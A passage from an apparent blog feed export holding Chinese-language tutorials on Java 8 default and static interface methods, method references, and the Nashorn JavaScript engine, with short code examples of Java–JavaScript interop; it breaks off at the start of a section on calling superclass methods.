<p>默认方法和抽象方法之间的区别在于抽象方法需要实现，而默认方法不需要。接口提供的默认方法会被接口的实现类继承或者覆写，例子代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private interface Defaulable &#123;</span><br><span class="line">    // Interfaces now allow default methods, the implementer may or</span><br><span class="line">    // may not implement (override) them.</span><br><span class="line">    default String notRequired() &#123;</span><br><span class="line">        return &quot;Default implementation&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static class DefaultableImpl implements Defaulable &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static class OverridableImpl implements Defaulable &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public String notRequired() &#123;</span><br><span class="line">        return &quot;Overridden implementation&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Defaulable接口使用关键字default定义了一个默认方法notRequired()。DefaultableImpl类实现了这个接口，同时默认继承了这个接口中的默认方法；OverridableImpl类也实现了这个接口，但覆写了该接口的默认方法，并提供了一个不同的实现。</p>
<p>Java 8带来的另一个有趣的特性是在接口中可以定义静态方法，例子代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private interface DefaulableFactory &#123;</span><br><span class="line">    // Interfaces now allow static methods</span><br><span class="line">    static Defaulable create( Supplier&lt; Defaulable &gt; supplier ) &#123;</span><br><span class="line">        return supplier.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面的代码片段整合了默认方法和静态方法的使用场景：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main( String[] args ) &#123;</span><br><span class="line">    Defaulable defaulable = DefaulableFactory.create( DefaultableImpl::new );</span><br><span class="line">    System.out.println( defaulable.notRequired() );</span><br><span class="line"></span><br><span class="line">    defaulable = DefaulableFactory.create( OverridableImpl::new );</span><br><span class="line">    System.out.println( defaulable.notRequired() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Default implementation</span><br><span class="line">Overridden implementation</span><br></pre></td></tr></table></figure>

<p>由于JVM上的默认方法的实现在字节码层面提供了支持，因此效率非常高。默认方法允许在不打破现有继承体系的基础上改进接口。该特性在官方库中的应用是：给java.util.Collection接口添加新方法，如stream()、parallelStream()、forEach()和removeIf()等等。</p>
<p>尽管默认方法有这么多好处，但在实际开发中应该谨慎使用：在复杂的继承体系中，默认方法可能引起歧义和编译错误。如果你想了解更多细节，可以参考官方文档。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA8之方法引用</title>
    <url>/blog/plang/java/features/java8/method/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前两篇文章分别介绍了Java8的lambda表达式和默认方法和静态接口方法。今天我们继续学习Java8的新语言特性——方法引用(Method References)。</p>
<p>在学习lambda表达式之后，我们通常使用lambda表达式来创建匿名方法。然而，有时候我们仅仅是调用了一个已存在的方法。如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.sort(stringsArray,(s1,s2)-&gt;s1.compareToIgnoreCase(s2));</span><br></pre></td></tr></table></figure>
<p>在Java8中，我们可以直接通过方法引用来简写lambda表达式中已经存在的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arrays.sort(stringsArray, String::compareToIgnoreCase);</span><br></pre></td></tr></table></figure>
<p>这种特性就叫做方法引用(Method Reference)。</p>
<h2 id="方法引用的形式"><a href="#方法引用的形式" class="headerlink" title="方法引用的形式"></a>方法引用的形式</h2><p>方法引用的标准形式是:<code>类名::方法名</code>。（注意：只需要写方法名，不需要写括号）</p>
<p>有以下四种形式的方法引用:</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>引用静态方法</td>
<td>ContainingClass::staticMethodName</td>
</tr>
<tr>
<td>引用某个对象的实例方法</td>
<td>containingObject::instanceMethodName</td>
</tr>
<tr>
<td>引用某个类型的任意对象的实例方法</td>
<td>ContainingType::methodName</td>
</tr>
<tr>
<td>引用构造方法</td>
<td>ClassName::new</td>
</tr>
</tbody></table>
<p>下面我们通过一个小Demo来分别学习这几种形式的方法引用:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    public enum Sex&#123;</span><br><span class="line">        MALE,FEMALE</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    LocalDate birthday;</span><br><span class="line">    Sex gender;</span><br><span class="line">    String emailAddress;</span><br><span class="line"></span><br><span class="line">    public String getEmailAddress() &#123;</span><br><span class="line">        return emailAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Sex getGender() &#123;</span><br><span class="line">        return gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public LocalDate getBirthday() &#123;</span><br><span class="line">        return birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static int compareByAge(Person a,Person b)&#123;</span><br><span class="line">        return a.birthday.compareTo(b.birthday);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="引用静态方法"><a href="#引用静态方法" class="headerlink" title="引用静态方法"></a>引用静态方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person [] persons = new Person[10];</span><br><span class="line"></span><br><span class="line">//使用匿名类</span><br><span class="line">Arrays.sort(persons, new Comparator&lt;Person&gt;() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public int compare(Person o1, Person o2) &#123;</span><br><span class="line">                return o1.birthday.compareTo(o2.birthday);</span><br><span class="line">            &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line">//使用lambda表达式</span><br><span class="line">Arrays.sort(persons, (o1, o2) -&gt; o1.birthday.compareTo(o2.birthday));</span><br><span class="line"></span><br><span class="line">//使用lambda表达式和类的静态方法</span><br><span class="line">Arrays.sort(persons, (o1, o2) -&gt; Person.compareByAge(o1,o2));</span><br><span class="line"></span><br><span class="line">//使用方法引用</span><br><span class="line">//引用的是类的静态方法</span><br><span class="line">Arrays.sort(persons, Person::compareByAge);</span><br></pre></td></tr></table></figure>

<h2 id="引用对象的实例方法"><a href="#引用对象的实例方法" class="headerlink" title="引用对象的实例方法"></a>引用对象的实例方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ComparisonProvider&#123;</span><br><span class="line">            public int compareByName(Person a,Person b)&#123;</span><br><span class="line">                return a.getName().compareTo(b.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public int compareByAge(Person a,Person b)&#123;</span><br><span class="line">                return a.getBirthday().compareTo(b.getBirthday());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">ComparisonProvider provider = new ComparisonProvider();</span><br><span class="line"></span><br><span class="line">//使用lambda表达式</span><br><span class="line">//对象的实例方法</span><br><span class="line">Arrays.sort(persons,(a,b)-&gt;provider.compareByAge(a,b));</span><br><span class="line"></span><br><span class="line">//使用方法引用</span><br><span class="line">//引用的是对象的实例方法</span><br><span class="line">Arrays.sort(persons, provider::compareByAge);</span><br></pre></td></tr></table></figure>

<h2 id="引用类型对象的实例方法"><a href="#引用类型对象的实例方法" class="headerlink" title="引用类型对象的实例方法"></a>引用类型对象的实例方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] stringsArray = &#123;&quot;Hello&quot;,&quot;World&quot;&#125;;</span><br><span class="line"></span><br><span class="line">//使用lambda表达式和类型对象的实例方法</span><br><span class="line">Arrays.sort(stringsArray,(s1,s2)-&gt;s1.compareToIgnoreCase(s2));</span><br><span class="line"></span><br><span class="line">//使用方法引用</span><br><span class="line">//引用的是类型对象的实例方法</span><br><span class="line">Arrays.sort(stringsArray, String::compareToIgnoreCase);</span><br></pre></td></tr></table></figure>

<h2 id="引用构造方法"><a href="#引用构造方法" class="headerlink" title="引用构造方法"></a>引用构造方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static &lt;T, SOURCE extends Collection&lt;T&gt;, DEST extends Collection&lt;T&gt;&gt;</span><br><span class="line">    DEST transferElements(SOURCE sourceColletions, Supplier&lt;DEST&gt; colltionFactory) &#123;</span><br><span class="line">        DEST result = colltionFactory.get();</span><br><span class="line">        for (T t : sourceColletions) &#123;</span><br><span class="line">            result.add(t);</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">final List&lt;Person&gt; personList = Arrays.asList(persons);</span><br><span class="line"></span><br><span class="line">//使用lambda表达式</span><br><span class="line">Set&lt;Person&gt; personSet = transferElements(personList,()-&gt; new HashSet&lt;&gt;());</span><br><span class="line"></span><br><span class="line">//使用方法引用</span><br><span class="line">//引用的是构造方法</span><br><span class="line">Set&lt;Person&gt; personSet2 = transferElements(personList, HashSet::new);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)JAVA8之Nashorn脚本引擎</title>
    <url>/blog/plang/java/features/java8/nashorn/</url>
    <content><![CDATA[<p>本文为了解所有关于 Nashorn JavaScript 引擎易于理解的代码例子。 Nashorn JavaScript 引擎是Java SE 8的一部分，它与其它像Google V8 (它是Google Chrome 和Node.js的引擎)的独立引擎相互竞争。 Nashorn 扩展了Java在JVM上运行动态JavaScript脚本的能力。在接下来的大约15分钟里，您将学习如何在 JVM 上动态运行 JavaScript。 通过一些简短的代码示例演示最近 Nashorn 的语言特性。 学习 Java 与 JavaScript 的相互调用。最后包括如何在日常的 Java 业务中整合动态脚本。</p>
<h2 id="使用Nashorn"><a href="#使用Nashorn" class="headerlink" title="使用Nashorn"></a>使用Nashorn</h2><p>Nashorn javascript 引擎要么在java程序中以编程的方式使用要么在命令行工具jjs使用，jjs在目录$JAVA_HOME&#x2F;bin中。如果你准备建立一个jjs的符号链接，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /usr/bin</span><br><span class="line">$ ln -s $JAVA_HOME/bin/jjs jjs</span><br><span class="line">$ jjs</span><br><span class="line">jjs&gt; print(&#x27;Hello World&#x27;);</span><br></pre></td></tr></table></figure>

<p>本教程关注的是在java代码中使用 nashorn ，所以我们现在跳过jjs。用java代码来一个简单的  HelloWorld示例，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;);</span><br><span class="line">engine.eval(&quot;print(&#x27;Hello World!&#x27;);&quot;);</span><br></pre></td></tr></table></figure>

<p>为了在java中执行JavaScript代码，首先使用原先Rhino (旧版Java中来自Mozilla的引擎)中的包javax.script来创建一个nashorn脚本引擎。.既可以向上面那样把JavaScript代码作为一个字符串来直接执行，也可放入一个js脚本文件中，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;);</span><br><span class="line">engine.eval(new FileReader(&quot;script.js&quot;));</span><br></pre></td></tr></table></figure>

<p>Nashorn javascript是基于 ECMAScript 5.1 ，但nashorn后续版本将支持 ECMAScript 6:当前Nashorn的策略是遵循ECMAScript规范。 当我们发布JDK 8时，我们将实现ECMAScript 5.1标准。后续的 Nashorn的版本将实现 ECMAScript Edition 6标准。</p>
<p>Nashorn定义了很多语言和扩展了 ECMAScript标准的API 。接下来我们看看java与JavaScript的通信。</p>
<h2 id="Java调用Javascript-函数"><a href="#Java调用Javascript-函数" class="headerlink" title="Java调用Javascript 函数"></a>Java调用Javascript 函数</h2><p>Nashorn 支持java代码直接调用定义在脚本文件中JavaScript函数。你可以把java对象作为函数的参数且在调用函数的java方法中接收返回的数据。</p>
<p>如下的JavaScript代码将会在java端调用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var fun1 = function(name) &#123;</span><br><span class="line">    print(&#x27;Hi there from Javascript, &#x27; + name);</span><br><span class="line">    return &quot;greetings from javascript&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">var fun2 = function (object) &#123;</span><br><span class="line">    print(&quot;JS Class Definition: &quot; + Object.prototype.toString.call(object));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>为了调用函数，你首先得把脚本引擎转换为 Invocable。NashornScriptEngine 实现了 Invocable 接口且定义一个调用JavaScript函数的方法 invokeFunction ，传入函数名即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;);</span><br><span class="line">engine.eval(new FileReader(&quot;script.js&quot;));</span><br><span class="line"> </span><br><span class="line">Invocable invocable = (Invocable) engine;</span><br><span class="line"> </span><br><span class="line">Object result = invocable.invokeFunction(&quot;fun1&quot;, &quot;Peter Parker&quot;);</span><br><span class="line">System.out.println(result);</span><br><span class="line">System.out.println(result.getClass());</span><br><span class="line"> </span><br><span class="line">// Hi there from Javascript, Peter Parker</span><br><span class="line">// greetings from javascript</span><br><span class="line">// class java.lang.String</span><br></pre></td></tr></table></figure>

<p>上述代码的执行将在控制台打印三行信息。调用 print 函数将输出内容通过管道送到 System.out 控制台，因此我们首先看到的是 JavaScript打印的信息。<br>现在我们通过传递任意的 Java 对象去调用第二个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">invocable.invokeFunction(&quot;fun2&quot;, new Date());</span><br><span class="line">// [object java.util.Date]</span><br><span class="line"> </span><br><span class="line">invocable.invokeFunction(&quot;fun2&quot;, LocalDateTime.now());</span><br><span class="line">// [object java.time.LocalDateTime]</span><br><span class="line"> </span><br><span class="line">invocable.invokeFunction(&quot;fun2&quot;, new Person());</span><br><span class="line">// [object com.winterbe.java8.Person]</span><br></pre></td></tr></table></figure>

<p>你可以传递任意 Java 对象而不会在 JavaScript 这边丢失类型信息。因为脚本本身是在 JVM 虚拟机中执行的，我们可以完全利用 nashorn 引擎的 Java API 和外部库的强大功能。<br>在 JavaScript 端调用 Java 方法</p>
<p>在 JavaScript 中调用 Java 方法很简单。首先我们定义一个静态的 Java 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static String fun1(String name) &#123;</span><br><span class="line">    System.out.format(&quot;Hi there from Java, %s&quot;, name);</span><br><span class="line">    return &quot;greetings from java&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JavaScript 可通过 Java.type API 来引用 Java 类。这跟在 Java 类中引入其他类是类似的。当定义了 Java 类型后我们可直接调用其静态方法 fun1() 并打印结果到 sout。因为方法是静态的，所以我们无需创建类实例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var MyJavaClass = Java.type(&#x27;my.package.MyJavaClass&#x27;);</span><br><span class="line"> </span><br><span class="line">var result = MyJavaClass.fun1(&#x27;John Doe&#x27;);</span><br><span class="line">print(result);</span><br><span class="line"> </span><br><span class="line">// Hi there from Java, John Doe</span><br><span class="line">// greetings from java</span><br></pre></td></tr></table></figure>

<p>当调用java 方法时，Nashorn怎样处理原生JavaScript类型与java类型转换？让我们用一个简单的例子来发现。下面的java方法简单打印实际的类方法参数的类型:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void fun2(Object object) &#123;</span><br><span class="line">    System.out.println(object.getClass());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了解引擎如何处理类型转换，我使用不同JavaScript类型来调用java方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MyJavaClass.fun2(123);</span><br><span class="line">// class java.lang.Integer</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(49.99);</span><br><span class="line">// class java.lang.Double</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(true);</span><br><span class="line">// class java.lang.Boolean</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(&quot;hi there&quot;)</span><br><span class="line">// class java.lang.String</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(new Number(23));</span><br><span class="line">// class jdk.nashorn.internal.objects.NativeNumber</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(new Date());</span><br><span class="line">// class jdk.nashorn.internal.objects.NativeDate</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(new RegExp());</span><br><span class="line">// class jdk.nashorn.internal.objects.NativeRegExp</span><br><span class="line"> </span><br><span class="line">MyJavaClass.fun2(&#123;foo: &#x27;bar&#x27;&#125;);</span><br><span class="line">// class jdk.nashorn.internal.scripts.JO4</span><br></pre></td></tr></table></figure>

<p>原始的javascript 类型被转换为适当的 java 包装器类。而不是本地javascript对象内部适配器类。请记住，这些类来自于jdk.nashorn.internal，所以你不应该在客户端使用这些类:Anything marked internal will likely change out from underneath you.<br>ScriptObjectMirror</p>
<p>当使用ScriptObjectMirror把本地JavaScript对象传入时，实际上是有一个java对象表示JavaScript 对象。 ScriptObjectMirror 实现了接口与jdk.nashorn.api内部的映射。这个包下的类目的就是用于客户端代码使用。</p>
<p>下一个示例更改参数类型Object为ScriptObjectMirror，因此我们能获取到传入JavaScript中对象的一些信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void fun3(ScriptObjectMirror mirror) &#123;</span><br><span class="line">    System.out.println(mirror.getClassName() + &quot;: &quot; +</span><br><span class="line">        Arrays.toString(mirror.getOwnKeys(true)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们把传递对象hash到方法中，在Java端就能访问这些属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MyJavaClass.fun3(&#123;</span><br><span class="line">    foo: &#x27;bar&#x27;,</span><br><span class="line">    bar: &#x27;foo&#x27;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">// Object: [foo, bar]</span><br></pre></td></tr></table></figure>

<p>我们也可以在Java端调用JavaScript对象中的函数。我们首先定义一个JavaScript类型 Person，包含属性 firstName 、lastName 和函数getFullName。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Person(firstName, lastName) &#123;</span><br><span class="line">    this.firstName = firstName;</span><br><span class="line">    this.lastName = lastName;</span><br><span class="line">    this.getFullName = function() &#123;</span><br><span class="line">        return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javascript 函数getFullName 能被 ScriptObjectMirror 的callMember()调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void fun4(ScriptObjectMirror person) &#123;</span><br><span class="line">    System.out.println(&quot;Full Name is: &quot; + person.callMember(&quot;getFullName&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们传入一个新的person给java 方法时，我们能在控制台看到预期结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var person1 = new Person(&quot;Peter&quot;, &quot;Parker&quot;);</span><br><span class="line">MyJavaClass.fun4(person1);</span><br><span class="line"> </span><br><span class="line">// Full Name is: Peter Parker</span><br></pre></td></tr></table></figure>

<h2 id="语言扩展"><a href="#语言扩展" class="headerlink" title="语言扩展"></a>语言扩展</h2><p>Nashorn 定义一系列的语言和扩展了 ECMAScript 标准的API。 让我们直接进入最新的功能：</p>
<h3 id="类型数组"><a href="#类型数组" class="headerlink" title="类型数组"></a>类型数组</h3><p>原始javascript 数组时无类型的。 Nashorn 运行你在JavaScript中使用java数组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var IntArray = Java.type(&quot;int[]&quot;);</span><br><span class="line"> </span><br><span class="line">var array = new IntArray(5);</span><br><span class="line">array[0] = 5;</span><br><span class="line">array[1] = 4;</span><br><span class="line">array[2] = 3;</span><br><span class="line">array[3] = 2;</span><br><span class="line">array[4] = 1;</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    array[5] = 23;</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    print(e.message);  // Array index out of range: 5</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">array[0] = &quot;17&quot;;</span><br><span class="line">print(array[0]);  // 17</span><br><span class="line"> </span><br><span class="line">array[0] = &quot;wrong type&quot;;</span><br><span class="line">print(array[0]);  // 0</span><br><span class="line"> </span><br><span class="line">array[0] = &quot;17.3&quot;;</span><br><span class="line">print(array[0]);  // 17</span><br></pre></td></tr></table></figure>

<p>int[] 数组的行为像一个真正的 java int 数组。 但当我们试图添加非整数的值的数组时，Nashorn 会执行隐式类型转换。 字符串会自动转换为int，这相当方便。</p>
<h3 id="集合与For-Each"><a href="#集合与For-Each" class="headerlink" title="集合与For Each"></a>集合与For Each</h3><p>我们可以使用java的集合来代替数组。首先定义使用 Java.type定义一个java类型，而后根据需要创建一个实例。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var ArrayList = Java.type(&#x27;java.util.ArrayList&#x27;);</span><br><span class="line">var list = new ArrayList();</span><br><span class="line">list.add(&#x27;a&#x27;);</span><br><span class="line">list.add(&#x27;b&#x27;);</span><br><span class="line">list.add(&#x27;c&#x27;);</span><br><span class="line"> </span><br><span class="line">for each (var el in list) print(el);  // a, b, c</span><br></pre></td></tr></table></figure>

<p>为了遍历集合和数组中的元素，Nashorn 引入了 for each 语句。这就像是 Java 的 for 循环一样。这里是一个对集合元素进行遍历的例子，使用的是 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var map = new java.util.HashMap();</span><br><span class="line">map.put(&#x27;foo&#x27;, &#x27;val1&#x27;);</span><br><span class="line">map.put(&#x27;bar&#x27;, &#x27;val2&#x27;);</span><br><span class="line"> </span><br><span class="line">for each (var e in map.keySet()) print(e);  // foo, bar</span><br><span class="line"> </span><br><span class="line">for each (var e in map.values()) print(e);  // val1, val2</span><br></pre></td></tr></table></figure>

<h3 id="Lambda-表达式和-Streams"><a href="#Lambda-表达式和-Streams" class="headerlink" title="Lambda 表达式和 Streams"></a>Lambda 表达式和 Streams</h3><p>似乎大家都比较喜欢 Lambda 和 Streams —— Nashorn 也是！虽然 ECMAScript 5.1 中缺少 Java 8 Lambda 表达式中的紧缩箭头的语法，但我们可以在接受 Lambda 表达式的地方使用函数来替代。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var list2 = new java.util.ArrayList();</span><br><span class="line">list2.add(&quot;ddd2&quot;);</span><br><span class="line">list2.add(&quot;aaa2&quot;);</span><br><span class="line">list2.add(&quot;bbb1&quot;);</span><br><span class="line">list2.add(&quot;aaa1&quot;);</span><br><span class="line">list2.add(&quot;bbb3&quot;);</span><br><span class="line">list2.add(&quot;ccc&quot;);</span><br><span class="line">list2.add(&quot;bbb2&quot;);</span><br><span class="line">list2.add(&quot;ddd1&quot;);</span><br><span class="line"> </span><br><span class="line">list2</span><br><span class="line">    .stream()</span><br><span class="line">    .filter(function(el) &#123;</span><br><span class="line">        return el.startsWith(&quot;aaa&quot;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .sorted()</span><br><span class="line">    .forEach(function(el) &#123;</span><br><span class="line">        print(el);</span><br><span class="line">    &#125;);</span><br><span class="line">    // aaa1, aaa2</span><br></pre></td></tr></table></figure>

<h3 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h3><p>Java 的类型可以简单的通过 Java.extend 进行扩展，在下个例子你将在脚本中创建一个多线程示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var Runnable = Java.type(&#x27;java.lang.Runnable&#x27;);</span><br><span class="line">var Printer = Java.extend(Runnable, &#123;</span><br><span class="line">    run: function() &#123;</span><br><span class="line">        print(&#x27;printed from a separate thread&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">var Thread = Java.type(&#x27;java.lang.Thread&#x27;);</span><br><span class="line">new Thread(new Printer()).start();</span><br><span class="line"> </span><br><span class="line">new Thread(function() &#123;</span><br><span class="line">    print(&#x27;printed from another thread&#x27;);</span><br><span class="line">&#125;).start();</span><br><span class="line"> </span><br><span class="line">// printed from a separate thread</span><br><span class="line">// printed from another thread</span><br></pre></td></tr></table></figure>

<h3 id="参数重载"><a href="#参数重载" class="headerlink" title="参数重载"></a>参数重载</h3><p>方法和函数可以使用点符号或方括号来进行调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var System = Java.type(&#x27;java.lang.System&#x27;);</span><br><span class="line">System.out.println(10);              // 10</span><br><span class="line">System.out[&quot;println&quot;](11.0);         // 11.0</span><br><span class="line">System.out[&quot;println(double)&quot;](12);   // 12.0</span><br></pre></td></tr></table></figure>

<p>在使用重载的参数来调用方法时可以传递可选参数来确定具体调用了哪个方法，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println(double)。</span><br><span class="line">Java Beans</span><br></pre></td></tr></table></figure>

<p>我们不需要常规的用 getter 或者 setter 来访问类成员属性，可直接用属性名简单访问 Java Bean 中的属性。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var Date = Java.type(&#x27;java.util.Date&#x27;);</span><br><span class="line">var date = new Date();</span><br><span class="line">date.year += 1900;</span><br><span class="line">print(date.year);  // 2014</span><br></pre></td></tr></table></figure>

<h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><p>如果只是简单的一行函数我们可以不用大括号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function sqr(x) x * x;</span><br><span class="line">print(sqr(3));    // 9</span><br></pre></td></tr></table></figure>

<h3 id="属性绑定"><a href="#属性绑定" class="headerlink" title="属性绑定"></a>属性绑定</h3><p>来自不同对象的属性可以绑定在一起：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var o1 = &#123;&#125;;</span><br><span class="line">var o2 = &#123; foo: &#x27;bar&#x27;&#125;;</span><br><span class="line"> </span><br><span class="line">Object.bindProperties(o1, o2);</span><br><span class="line"> </span><br><span class="line">print(o1.foo);    // bar</span><br><span class="line">o1.foo = &#x27;BAM&#x27;;</span><br><span class="line">print(o2.foo);    // BAM</span><br></pre></td></tr></table></figure>

<h3 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h3><p>我喜欢字符串裁剪.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;   hehe&quot;.trimLeft());            // hehe</span><br><span class="line">print(&quot;hehe    &quot;.trimRight() + &quot;he&quot;);   // hehehe</span><br></pre></td></tr></table></figure>

<h3 id="在哪里"><a href="#在哪里" class="headerlink" title="在哪里"></a>在哪里</h3><p>以防忘记你在哪里:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(__FILE__, __LINE__, __DIR__);</span><br></pre></td></tr></table></figure>

<h3 id="Import-的范围"><a href="#Import-的范围" class="headerlink" title="Import 的范围"></a>Import 的范围</h3><p>有时，这在一次性导入多个java 包时非常有用。我们可以使用JavaImporter并结合with，在with块范围内引用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var imports = new JavaImporter(java.io, java.lang);</span><br><span class="line">with (imports) &#123;</span><br><span class="line">    var file = new File(__FILE__);</span><br><span class="line">    System.out.println(file.getAbsolutePath());</span><br><span class="line">    // /path/to/my/script.js</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数组转换"><a href="#数组转换" class="headerlink" title="数组转换"></a>数组转换</h3><p>有些包时可以直接使用而不必利用 Java.type 或JavaImporter引入，如 java.util:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var list = new java.util.ArrayList();</span><br><span class="line">list.add(&quot;s1&quot;);</span><br><span class="line">list.add(&quot;s2&quot;);</span><br><span class="line">list.add(&quot;s3&quot;);</span><br></pre></td></tr></table></figure>

<p>如下的代码演示了将java list转换为JavaScript的数组：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var jsArray = Java.from(list);</span><br><span class="line">print(jsArray);                                  // s1,s2,s3</span><br><span class="line">print(Object.prototype.toString.call(jsArray));  // [object Array]</span><br></pre></td></tr></table></figure>

<p>其他的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var javaArray = Java.to([3, 5, 7, 11], &quot;int[]&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="调用父类函数"><a href="#调用父类函数" class="headerlink" title="调用父类函数"></a>调用父类函数</h3><p>在 JavaScript 中访问重载的成员会有一点点尴尬，因为 ECMAScript 没有类似 Java 的 super 关键字一样的东西。所幸的是 Nashorn 有办法解决。</p>
<p>首先我们在 Java 代码中定义一个超类：</p>
